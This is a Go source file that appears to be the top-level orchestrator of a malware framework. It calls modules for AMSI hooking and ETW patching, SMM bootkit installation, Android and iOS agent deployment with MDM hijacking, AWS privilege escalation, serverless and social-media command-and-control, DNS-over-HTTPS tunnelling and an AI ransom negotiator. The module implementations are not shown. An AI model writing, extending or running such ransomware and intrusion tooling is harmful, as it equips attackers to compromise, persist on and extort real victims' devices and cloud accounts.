package v26

import (
	"context"
	"encoding/json"
	"sync"
)

type V26Orchestrator struct {
	Config        *V26Config
	POMDP         *POMDPOrchestrator
	AINegotiator  *AINegotiator
	EvasionDEEP   *EvasionDEEPEngine
	BootkitSMM    *BootkitSMMEngine
	MobileX       *MobileXEngine
	CloudNemesis  *CloudNemesisEngine
	SocialC2      *SocialC2Engine
	BlockOmega    *BlockOmegaEngine
	Status        map[string]bool
	mu            sync.Mutex
}

func NewV26Orchestrator(cfg *V26Config) *V26Orchestrator {
	return &V26Orchestrator{
		Config:        cfg,
		POMDP:         NewPOMDPOrchestrator(cfg),
		AINegotiator:  NewAINegotiator(cfg),
		EvasionDEEP:   NewEvasionDEEPEngine(cfg),
		BootkitSMM:    NewBootkitSMMEngine(cfg),
		MobileX:       NewMobileXEngine(cfg),
		CloudNemesis:  NewCloudNemesisEngine(cfg),
		SocialC2:      NewSocialC2Engine(cfg),
		BlockOmega:    NewBlockOmegaEngine(cfg),
		Status:        make(map[string]bool),
	}
}

func (vo *V26Orchestrator) ExecuteAll(ctx context.Context) map[string]bool {
	vo.mu.Lock()
	defer vo.mu.Unlock()

	if vo.Config.POMDPEnable {
		vo.POMDP.EnableGodMode()
		vo.POMDP.Decide(ctx)
		vo.Status["pomdp"] = true
	}

	if vo.Config.AIGotchaEnable {
		vo.AINegotiator.GenerateResponse("We need to negotiate the ransom amount")
		vo.Status["ai_negotiation"] = true
	}

	if vo.Config.EvasionDEEPEnable {
		vo.EvasionDEEP.HookAMSI()
		vo.EvasionDEEP.PatchETW()
		vo.Status["evasion_deep"] = true
	}

	if vo.Config.BootkitSMMEnable {
		vo.BootkitSMM.InstallSMMBootkit()
		vo.Status["bootkit_smm"] = true
	}

	if vo.Config.MobileXEnable {
		vo.MobileX.DeployAndroidAgent()
		vo.MobileX.DeployIOSAgent()
		vo.MobileX.HijackMDM()
		vo.Status["mobile_x"] = true
	}

	if vo.Config.CloudNemesisEnable {
		vo.CloudNemesis.EscalateAWS()
		vo.CloudNemesis.DeployServerlessC2()
		vo.Status["cloud_nemesis"] = true
	}

	if vo.Config.SocialC2Enable {
		vo.SocialC2.StartTwitterC2()
		vo.SocialC2.StartRedditC2()
		vo.SocialC2.StartDoHTunneling()
		vo.Status["social_c2"] = true
	}

	if vo.Config.BlockOmegaEnable {
		omegaResults := vo.BlockOmega.ExecuteAll()
		for k, v := range omegaResults {
			vo.Status["omega_"+k] = v
		}
	}

	return vo.Status
}

func (vo *V26Orchestrator) GetFullStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"status": vo.Status,
		"pomdp":  vo.POMDP.GetStatusJSON(),
		"ai":     vo.AINegotiator.GetStatusJSON(),
		"evasion": vo.EvasionDEEP.GetStatusJSON(),
		"bootkit": vo.BootkitSMM.GetStatusJSON(),
		"mobile":  vo.MobileX.GetStatusJSON(),
		"cloud":   len(vo.CloudNemesis.LambdaNames),
		"social":  vo.SocialC2.TwitterEnabled,
		"omega":   vo.BlockOmega.GetStatusJSON(),
	})
	return string(data)
}
